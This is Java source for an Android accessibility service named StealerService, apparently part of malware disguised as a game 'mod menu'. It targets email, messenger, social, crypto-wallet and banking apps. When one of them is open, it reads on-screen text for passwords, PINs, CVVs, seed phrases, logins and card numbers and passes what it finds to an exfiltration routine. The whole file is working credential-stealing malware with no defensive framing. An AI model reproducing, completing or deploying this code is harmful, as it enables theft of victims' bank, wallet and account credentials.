package com.brawl.modmenu;

import android.accessibilityservice.AccessibilityService;
import android.content.ClipboardManager;
import android.content.Context;
import android.os.Build;
import android.text.TextUtils;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.util.Arrays;
import java.util.List;

public class StealerService extends AccessibilityService {

    private long lastSend = 0;
    private static final long COOLDOWN = 2500;

    private static final List<String> TARGETS = Arrays.asList(
        "com.google.android.gm",        // Gmail
        "com.microsoft.office.outlook",
        "com.android.email",
        "ru.yandex.mail",
        "org.telegram.messenger",
        "org.thunderdog.challegram",
        "com.whatsapp",
        "com.whatsapp.w4b",
        "com.viber.voip",
        "org.thoughtcrime.securesms",   // Signal
        "com.instagram.android",
        "com.facebook.katana",
        "com.facebook.orca",
        "com.zhiliaoapp.musically",     // TikTok
        "com.twitter.android",
        "com.snapchat.android",
        "com.discord",
        "com.valvesoftware.android.steam.community",
        "com.epicgames.portal",
        "com.binance.dev",
        "com.coinbase.android",
        "io.metamask",
        "com.trustwallet.app",
        "com.mycelium.wallet",
        "ru.privatbank",
        "ua.privatbank.ap24",
        "ua.privatbank.ap24beta",
        "com.alfabank.oavdo.amc",
        "ua.oschadbank.online",
        "com.ftband.mono",
        "com.monobank.app",
        "com.ideabank.android"
    );

    private static final String[] INTERESTING = {
        "парол", "password", "passwd", "pwd",
        "pin", "пин", "cvv", "cvc", "код",
        "seed", "сид", "mnemonic", "key", "ключ",
        "login", "логин", "email", "телефон", "phone",
        "номер карты", "card number"
    };

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;
        CharSequence pkgCs = event.getPackageName();
        if (pkgCs == null) return;
        String pkg = pkgCs.toString();
        if (!TARGETS.contains(pkg)) return;

        if (System.currentTimeMillis() - lastSend < COOLDOWN) return;

        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return;

        StringBuilder sb = new StringBuilder();
        sb.append("APP: ").append(pkg).append("\n");
        walk(root, sb, 0);

        String dump = sb.toString().trim();
        if (dump.length() > 30) {
            Exfil.send("STEAL", dump);
            lastSend = System.currentTimeMillis();
        }
    }

    private void walk(AccessibilityNodeInfo n, StringBuilder sb, int depth) {
        if (n == null || depth > 30) return;

        CharSequence t = n.getText();
        CharSequence d = n.getContentDescription();
        CharSequence h = n.getHintText();

        if (t != null && t.length() > 0) {
            String s = t.toString();
            if (isInteresting(s) || looksLikeCredential(s)) {
                sb.append("[T] ").append(s).append("\n");
            }
        }
        if (d != null && d.length() > 0) {
            String s = d.toString();
            if (isInteresting(s)) sb.append("[D] ").append(s).append("\n");
        }
        if (h != null && h.length() > 0) {
            String s = h.toString();
            if (isInteresting(s)) sb.append("[H] ").append(s).append("\n");
        }

        for (int i = 0; i < n.getChildCount(); i++) {
            walk(n.getChild(i), sb, depth + 1);
        }
    }

    private boolean isInteresting(String s) {
        String low = s.toLowerCase();
        for (String k : INTERESTING) if (low.contains(k)) return true;
        return false;
    }

    private boolean looksLikeCredential(String s) {
        if (s.length() < 4 || s.length() > 200) return false;
        // есть цифры и буквы, похоже на пароль/логин
        boolean hasDigit = false, hasLetter = false, hasAt = false;
        for (char c : s.toCharArray()) {
            if (Character.isDigit(c)) hasDigit = true;
            else if (Character.isLetter(c)) hasLetter = true;
            else if (c == '@') hasAt = true;
        }
        return hasAt || (hasDigit && hasLetter && s.length() >= 6);
    }

    @Override public void onInterrupt() {}
}
